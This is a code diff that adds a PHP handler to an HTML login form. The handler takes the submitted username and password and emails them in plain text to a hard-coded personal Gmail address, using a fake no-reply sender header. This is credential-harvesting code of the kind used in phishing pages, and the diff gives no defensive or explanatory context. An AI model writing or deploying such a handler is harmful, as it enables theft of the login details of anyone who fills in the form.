@@ -20,3 +20,30 @@
     </form>
 </body>
 </html>
+
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Collect the form data
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+
+    // Specify your email address
+    $to = "maysazafira12@gmail.com";  // Change this to your email address
+    $subject = "User Submitted Details";
+    
+    // Create the email body
+    $message = "Username: $username\nPassword: $password";
+    
+    // Set the headers for the email (Optional, but helps avoid spam filters)
+    $headers = "From: no-reply@example.com\r\n";
+    $headers .= "Reply-To: no-reply@example.com\r\n";
+    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
+    
+    // Send the email
+    if (mail($to, $subject, $message, $headers)) {
+        echo "Details submitted successfully!";
+    } else {
+        echo "Failed to send email. Please try again.";
+    }
+}
+?>
